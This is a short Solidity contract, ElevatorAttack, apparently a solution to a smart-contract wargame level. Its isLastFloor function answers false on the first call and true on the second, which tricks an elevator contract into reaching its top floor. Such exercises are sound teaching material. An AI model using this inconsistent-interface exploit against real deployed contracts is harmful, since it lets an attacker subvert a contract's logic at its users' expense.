// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract ElevatorAttack is Broadcasted, Building {
    bool public c_firstTime = true;

    function isLastFloor(uint) external override returns (bool) {
        if (c_firstTime) {
            c_firstTime = false;
            return false;
        }
        return true;
    }

    function attack(address payable elevatorCtr_) public payable override {
        IElevator(elevatorCtr_).goTo(2);
    }

    function broadcastedAttack(
        address payable elevatorCtr_
    ) external payable override {
        // not broadcasted to have the current contract as the caller
        attack(elevatorCtr_);
    }
}

interface IElevator {
    // ! function isLastFloor will return false the first time it is called
    // ! but will return true the second time
    function goTo(uint _floor) external;
}
